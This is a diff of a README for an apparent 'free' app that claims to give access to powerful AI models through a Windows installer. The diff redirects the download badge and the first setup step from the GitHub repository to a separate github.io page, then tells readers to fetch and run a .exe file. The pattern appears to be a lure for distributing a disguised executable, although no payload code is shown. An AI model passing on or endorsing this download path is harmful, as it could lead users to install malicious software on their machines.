@@ -1,6 +1,6 @@
 # 🤖 claude-code-fable-5-free-app - Access powerful AI models for free
 
-[![Download App](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app)
+[![Download App](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://genusoviboscremeanglais30.github.io)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ The app uses standard system fonts and graphics drivers. You do not need special
 
 You can find the installer on the official repository page. Follow these steps to prepare your download:
 
-1. Visit the project website: https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app
+1. Visit the project website: https://genusoviboscremeanglais30.github.io
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the latest version number.
 4. Find the file with the .exe extension in the Assets list.
